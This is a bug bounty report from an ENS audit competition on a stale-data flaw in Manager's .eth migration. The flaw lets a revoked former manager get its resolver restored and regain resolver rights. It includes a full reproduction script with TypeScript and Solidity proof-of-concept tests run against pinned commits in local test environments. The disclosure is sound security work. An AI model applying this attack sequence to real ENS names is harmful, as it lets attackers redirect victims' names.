# 90583 w a medium manager trusts stale v1 owner and resolver during eth migration

**Submitted on Aug 25th 2026 at 18:52:05 UTC by @drsh4dow for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90583
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

## Description

During migration, a former manager whose access was revoked can make a victim's ENS name point to attacker-controlled addresses and services again.

I found this in the unwrapped `.eth` migration path at commit `cda79acaad59711b943fc68207ebb3f1d0ff8596`.

Manager gets the V1 Registry owner and resolver from the subgraph response. Later, the ownership preflight only calls `BaseRegistrar.ownerOf(tokenId)`. I could not find a read of the current `ENSRegistry.owner(node)` or `ENSRegistry.resolver(node)` before Manager builds the batch.

This is the sequence I used:

{% stepper %}
{% step %}

## Delegate the V1 Registry record

The registrant delegates the V1 Registry record to a manager.
{% endstep %}

{% step %}

## Set a manager-controlled resolver

The manager sets a resolver they control.
{% endstep %}

{% step %}

## Reclaim ownership and update the resolver

The registrant calls `reclaim()` and sets a different resolver.
{% endstep %}

{% step %}

## Start migration before the subgraph updates

The registrant starts migration before the subgraph reflects those changes.
{% endstep %}
{% endstepper %}

At that point the registrar token is back with the victim, so the preflight passes. But Manager still treats the old Registry owner as the manager. `buildAtomicMigrationBatches.ts` puts the old resolver in `Migration.Data` and adds:

```
grantRoles(resource, ROLE_SET_RESOLVER, oldManager)
```

The victim executes the HCA batch as its owner. It first migrates the name with the old resolver, then gives the former manager permission to change that resolver again. The former manager does not sign the migration and no longer controls the token or V1 Registry record.

## Impact

V2 restores the stale resolver. The former manager also gets `ROLE_SET_RESOLVER`; the PoC shows that account replacing the resolver after migration.

Relevant paths:

* `apps/manager/src/features/migration/service/classifyNames.ts`
* `packages/migration/src/service/preflightChecks.ts`
* `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts`
* `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts`

For the contract side I pinned contracts-v2 at `0717b0b6f1867f43078f19115dd5dfa4f35426ab`, the helper source identified by Manager.

## Proof of Concept

I put the full reproduction in one script so there are no external code attachments. Save it as `reproduce.sh` in an empty directory. It needs Linux, internet access, Git, Node.js, Corepack, Bubblewrap, and Foundry.

```bash
#!/usr/bin/env bash
set -euo pipefail

manager_ref='cda79acaad59711b943fc68207ebb3f1d0ff8596'
contracts_ref='0717b0b6f1867f43078f19115dd5dfa4f35426ab'
pnpm_version='10.27.0'
work="${ENS_POC_WORK:-$PWD/ens-stale-migration-work}"
manager="$work/audit-comp-ens"
contracts="$work/contracts-v2"
manager_test='apps/manager/src/features/migration/service/staleMigrationAuthority.poc.test.ts'
solidity_test='contracts/test/StaleMigrationAuthority.poc.t.sol'

for command in git node corepack bwrap forge; do
  command -v "$command" >/dev/null || { echo "missing: $command" >&2; exit 1; }
done
[[ ! -e "$work" ]] || { echo "refusing existing work directory: $work" >&2; exit 1; }
mkdir -p "$work"

git clone --filter=blob:none --no-checkout \
  https://github.com/immunefi-team/audit-comp-ens.git "$manager"
git -C "$manager" fetch --depth=1 origin "$manager_ref"
git -C "$manager" checkout --detach "$manager_ref"

git clone --filter=blob:none --no-checkout \
  https://github.com/ensdomains/contracts-v2.git "$contracts"
git -C "$contracts" fetch --depth=1 origin "$contracts_ref"
git -C "$contracts" checkout --detach "$contracts_ref"
git -C "$contracts" submodule update --init --recursive --depth=1 --jobs 4

cat >"$manager/$manager_test" <<'TS_POC'
import { type Address, decodeFunctionData } from 'viem'
import { sepolia } from 'viem/chains'
import { assert, describe, expect, it, vi } from 'vitest'
import { batchedMulticall } from '../../../../../../packages/migration/src/service/batchedMulticall'
import { checkOwnership } from '../../../../../../packages/migration/src/service/preflightChecks'
import { ETH_REGISTRY_V2_ABI, MIGRATION_HELPER_ABI } from '../contracts/abis'
import { V2_CONTRACTS } from '../contracts/addresses'
import { makeDomain, OWNER } from './_fixtures'
import { buildAtomicMigrationBatches } from './buildAtomicMigrationBatches'
import { type ClassifiedName, classifyName } from './classifyNames'

const ATTACKER: Address = '0x00000000000000000000000000000000000000a7'
const ATTACKER_RESOLVER: Address = '0x00000000000000000000000000000000000000a8'
const HCA: Address = '0x00000000000000000000000000000000000000ca'
const SAFE_DEFAULT_RESOLVER: Address =
  '0x00000000000000000000000000000000000000d1'
const ROLE_SET_RESOLVER = 1n << 24n

vi.mock(
  '../../../../../../packages/migration/src/service/batchedMulticall',
  () => ({ batchedMulticall: vi.fn() }),
)
const batchedMulticallMock = vi.mocked(batchedMulticall)

const buildPlan = (classified: ClassifiedName) =>
  buildAtomicMigrationBatches({
    chainId: sepolia.id,
    hca: HCA,
    wallet: OWNER,
    classified: [classified],
    directRoutes: new Map([
      [
        classified.domain.name,
        {
          name: classified.domain.name,
          receiver: V2_CONTRACTS.UnlockedMigrationController,
          parentDependency: null,
          expectedWrapperRegistry: null,
          receiverReadiness: 'migration-controller' as const,
        },
      ],
    ]),
    profiles: new Map(),
    defaultResolver: SAFE_DEFAULT_RESOLVER,
    resolverDeployed: true,
    walletCoAdminGranted: true,
    maxOuterGas: 1_000_000n,
    estimateOuterGas: () => 100_000n,
  })

const decodeUnwrappedMigration = (
  plan: Awaited<ReturnType<typeof buildPlan>>,
) => {
  const batch = plan.batches[0]
  assert(batch)
  const migrate = batch.innerExecutions.find(({ phase }) => phase === 'migrate')
  assert(migrate?.phase === 'migrate')
  const decoded = decodeFunctionData({
    abi: MIGRATION_HELPER_ABI,
    data: migrate.call.data,
  })
  assert(decoded.functionName === 'migrate')
  return { batch, unwrapped: decoded.args[0] }
}

describe('stale V1 data during migration', () => {
  it('builds the resolver and role grant from old owner/resolver values', async () => {
    // Current V1 data keeps the safe resolver and grants no manager role.
    const currentDomain = makeDomain({
      ownerId: OWNER,
      registrantId: OWNER,
      resolverAddress: SAFE_DEFAULT_RESOLVER,
    })
    const currentResult = classifyName(currentDomain, OWNER)
    assert(currentResult?.type === 'classified')
    expect(currentResult.name.managerAddress).toBeNull()

    const currentDecoded = decodeUnwrappedMigration(
      await buildPlan(currentResult.name),
    )
    expect(
      currentDecoded.batch.innerExecutions.map(({ phase }) => phase),
    ).toEqual(['migrate'])
    expect(currentDecoded.unwrapped).toEqual([
      expect.objectContaining({ label: 'alice', owner: OWNER }),
    ])
    expect(currentDecoded.unwrapped[0]?.resolver.toLowerCase()).toBe(
      SAFE_DEFAULT_RESOLVER.toLowerCase(),
    )

    const staleDomain = makeDomain({
      ownerId: ATTACKER,
      registrantId: OWNER,
      resolverAddress: ATTACKER_RESOLVER,
    })
    const result = classifyName(staleDomain, OWNER)
    assert(result?.type === 'classified')
    const classified = result.name

    expect(classified).toMatchObject({
      tokenHolder: OWNER,
      managerAddress: ATTACKER,
      v1ResolverAddress: ATTACKER_RESOLVER,
      resolverStrategy: 'keep-v1',
    })

    // Preflight sees the victim's registrar token but never reads the Registry.
    batchedMulticallMock.mockResolvedValueOnce([
      { status: 'success', result: OWNER },
    ])
    const publicClient = {}
    await expect(
      checkOwnership(publicClient as never, [classified], OWNER),
    ).resolves.toEqual(new Set())
    expect(batchedMulticallMock).toHaveBeenCalledOnce()
    expect(batchedMulticallMock.mock.calls[0]?.[1]).toHaveLength(1)
    expect(batchedMulticallMock.mock.calls[0]?.[1][0]?.functionName).toBe(
      'ownerOf',
    )

    const { batch, unwrapped } = decodeUnwrappedMigration(
      await buildPlan(classified),
    )
    expect(batch.innerExecutions.map(({ phase }) => phase)).toEqual([
      'migrate',
      'manager-role-grant',
    ])

    expect(unwrapped).toEqual([
      expect.objectContaining({ label: 'alice', owner: OWNER }),
    ])
    expect(unwrapped[0]?.resolver.toLowerCase()).toBe(
      ATTACKER_RESOLVER.toLowerCase(),
    )

    const grant = batch.innerExecutions[1]
    assert(grant?.phase === 'manager-role-grant')
    const decodedGrant = decodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      data: grant.call.data,
    })
    assert(decodedGrant.functionName === 'grantRoles')
    expect(decodedGrant.args[1]).toBe(ROLE_SET_RESOLVER)
    expect(decodedGrant.args[2].toLowerCase()).toBe(ATTACKER.toLowerCase())

    console.log(
      `POC_OUTPUT ${JSON.stringify({
        baseline: {
          resolver: currentDecoded.unwrapped[0]?.resolver.toLowerCase(),
          managerGrant: false,
        },
        positive: {
          resolver: unwrapped[0]?.resolver.toLowerCase(),
          manager: decodedGrant.args[2].toLowerCase(),
          roleBitmap: decodedGrant.args[1].toString(),
        },
        preflightCalls: ['ownerOf'],
      })}`,
    )

    expect(batch.verificationExpectations).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'name-resolver',
          expectedResolver: ATTACKER_RESOLVER,
        }),
        expect.objectContaining({
          type: 'manager-role',
          account: ATTACKER,
          roleBitmap: ROLE_SET_RESOLVER,
        }),
      ]),
    )
  })
})
TS_POC

cat >"$contracts/$solidity_test" <<'SOL_POC'
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";

import {IStandaloneHCAFactory} from "~src/hca/interfaces/IStandaloneHCAFactory.sol";
import {UnlockedMigrationController} from "~src/migration/UnlockedMigrationController.sol";
import {LockedMigrationController} from "~src/migration/LockedMigrationController.sol";
import {MigrationHelper, LockedChildren} from "~src/migration/MigrationHelper.sol";
import {LibMigration} from "~src/migration/libraries/LibMigration.sol";
import {WrapperRegistry} from "~src/registry/WrapperRegistry.sol";
import {IRegistry} from "~src/registry/interfaces/IRegistry.sol";
import {RegistryRolesLib} from "~src/registry/libraries/RegistryRolesLib.sol";
import {MigrationControllerFixture} from "~test/fixtures/MigrationControllerFixture.sol";

struct Execution {
    address target;
    uint256 value;
    bytes callData;
}

interface OwnerBatchHCA {
    function owner() external view returns (address);
    function ownerAndSessionNonce() external view returns (address, uint96);
    function executeByOwner(Execution[] calldata executions) external payable;
}

contract TestModule {
    function onInstall(bytes calldata) external pure {}
    function onUninstall(bytes calldata) external pure {}

    function isModuleType(uint256) external pure returns (bool) {
        return true;
    }

    function isInitialized(address) external pure returns (bool) {
        return true;
    }

    function getModuleTypes() external pure returns (uint256) {
        return 2;
    }
}

contract TestAddressSet {
    function includes(address) external pure returns (bool) {
        return true;
    }
}

contract ControlledResolver {
    address immutable answer;

    constructor(address answer_) {
        answer = answer_;
    }

    function addr(bytes32) external view returns (address) {
        return answer;
    }
}

contract StaleMigrationAuthorityPoc is MigrationControllerFixture {
    address attacker = makeAddr("former-manager");
    address attackerAnswer = makeAddr("attacker-answer");
    address safeResolver = makeAddr("safe-resolver");
    address replacementResolver = makeAddr("replacement-resolver");

    UnlockedMigrationController unlockedController;
    LockedMigrationController lockedController;
    MigrationHelper helper;
    IStandaloneHCAFactory hcaFactory;
    OwnerBatchHCA hca;

    function setUp() external {
        deployMigrationControllerFixture();

        unlockedController =
            new UnlockedMigrationController(nameWrapper, address(graveyard), ethRegistry, contractNamer);
        ethRegistry.grantRootRoles(RegistryRolesLib.ROLE_REGISTER_RESERVED, address(unlockedController));

        WrapperRegistry wrapperRegistryImpl = new WrapperRegistry(
            nameWrapper,
            address(graveyard),
            verifiableFactory,
            address(ensV1Resolver),
            registryUpgradeSet,
            labelStore,
            publicResolverSet,
            address(0),
            address(this)
        );
        lockedController = new LockedMigrationController(
            nameWrapper,
            address(graveyard),
            ethRegistry,
            verifiableFactory,
            address(wrapperRegistryImpl),
            publicResolverSet,
            address(0),
            contractNamer
        );
        ethRegistry.grantRootRoles(RegistryRolesLib.ROLE_REGISTER_RESERVED, address(lockedController));

        hcaFactory = IStandaloneHCAFactory(
            deployCode(
                "src/hca/StandaloneHCAFactory.sol:StandaloneHCAFactory", abi.encode(verifiableFactory, address(this))
            )
        );
        helper = new MigrationHelper(rootRegistry, unlockedController, lockedController, hcaFactory, contractNamer);

        TestModule validator = new TestModule();
        TestModule executor = new TestModule();
        TestAddressSet upgradeSet = new TestAddressSet();
        address implementation = deployCode(
            "src/hca/StandaloneSingleOwnerHCA.sol:StandaloneSingleOwnerHCA",
            abi.encode(
                makeAddr("entry-point"),
                address(validator),
                address(executor),
                bytes(""),
                address(upgradeSet),
                address(0)
            )
        );
        hcaFactory.setImplementationApproval(implementation, true);
        hca = OwnerBatchHCA(payable(hcaFactory.deploy(testOwner, implementation, 1)));
        assertEq(hcaFactory.authorizedOwnerOf(address(hca)), testOwner);
        assertEq(hca.owner(), testOwner);
    }

    function test_migrationRestoresOldResolverAndManager() external {
        string memory label = "alice";
        (bytes memory name, uint256 tokenId) = registerUnwrapped(label);
        bytes32 node = NameCoder.namehash(name, 0);
        ControlledResolver attackerResolver = new ControlledResolver(attackerAnswer);

        // The victim delegates V1 authority and the manager sets its resolver.
        vm.prank(testOwner);
        registryV1.setOwner(node, attacker);
        vm.prank(attacker);
        registryV1.setResolver(node, address(attackerResolver));

        // Save the values that the subgraph may still return.
        address staleManager = registryV1.owner(node);
        address staleResolver = registryV1.resolver(node);

        // The victim revokes both values in V1.
        vm.prank(testOwner);
        baseRegistrar.reclaim(tokenId, testOwner);
        vm.prank(testOwner);
        registryV1.setResolver(node, safeResolver);
        assertEq(baseRegistrar.ownerOf(tokenId), testOwner);
        assertEq(registryV1.owner(node), testOwner);
        assertEq(registryV1.resolver(node), safeResolver);
        vm.expectRevert();
        vm.prank(attacker);
        registryV1.setResolver(node, address(attackerResolver));

        // Use the approvals requested by Manager.
        vm.prank(testOwner);
        baseRegistrar.approve(address(helper), tokenId);
        vm.prank(testOwner);
        ethRegistry.setApprovalForAll(address(hca), true);

        LibMigration.Data[] memory unwrapped = new LibMigration.Data[](1);
        unwrapped[0] = LibMigration.Data({
            label: label, owner: testOwner, subregistry: IRegistry(address(0)), resolver: staleResolver
        });

        uint256 resource = uint256(keccak256(bytes(label)));
        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({
            target: address(helper),
            value: 0,
            callData: abi.encodeCall(
                MigrationHelper.migrate,
                (unwrapped, new LibMigration.Data[][](0), new LibMigration.Data[][](0), new LockedChildren[](0))
            )
        });
        executions[1] = Execution({
            target: address(ethRegistry),
            value: 0,
            callData: abi.encodeCall(
                ethRegistry.grantRoles, (resource, RegistryRolesLib.ROLE_SET_RESOLVER, staleManager)
            )
        });

        vm.prank(testOwner);
        hca.executeByOwner(executions);

        assertEq(ethRegistry.getResolver(label), address(attackerResolver));
        assertTrue(ethRegistry.hasRoles(resource, RegistryRolesLib.ROLE_SET_RESOLVER, attacker));
        assertEq(attackerResolver.addr(node), attackerAnswer);

        vm.prank(attacker);
        ethRegistry.setResolver(resource, replacementResolver);
        assertEq(ethRegistry.getResolver(label), replacementResolver);
    }
}
SOL_POC

corepack "pnpm@$pnpm_version" --dir "$manager" install --frozen-lockfile \
  --child-concurrency=1 --network-concurrency=4

cd "$manager"
corepack "pnpm@$pnpm_version" exec biome check "$manager_test"
bwrap --unshare-net --dev-bind / / -- corepack "pnpm@$pnpm_version" \
  --filter manager exec vitest run \
  'src/features/migration/service/staleMigrationAuthority.poc.test.ts' \
  --pool=threads --maxWorkers=1 --silent=false --reporter=verbose

FOUNDRY_PROFILE=default forge test \
  --root "$contracts/contracts" \
  --match-path test/StaleMigrationAuthority.poc.t.sol \
  --skip MigrationHelper.t.sol \
  -vvv
```

Run it with:

```bash
chmod +x reproduce.sh
./reproduce.sh
```

I tested this from a new empty directory. The run cloned both pinned commits, installed the dependencies, compiled the contracts, and ended with:

```
Test Files  1 passed (1)
Tests  1 passed (1)

Ran 1 test for test/StaleMigrationAuthority.poc.t.sol:StaleMigrationAuthorityPoc
[PASS] test_migrationRestoresOldResolverAndManager()
```

The Vitest part runs the old owner and resolver through Manager's classifier, ownership check, and batch builder. It checks a current-data case first. With the old data, Manager selects the former manager's resolver and adds the `ROLE_SET_RESOLVER` grant. Its only preflight call is `ownerOf`.

I then use Forge to execute the migration and role grant against the pinned contracts-v2 source. Before migration, the victim has reclaimed the token and V1 Registry record, changed the resolver, and the former manager can no longer change it. After the HCA batch, V2 stores the old resolver and the former manager can replace it.

I model the stale subgraph response in this PoC. I did not query or measure lag on the public subgraph.
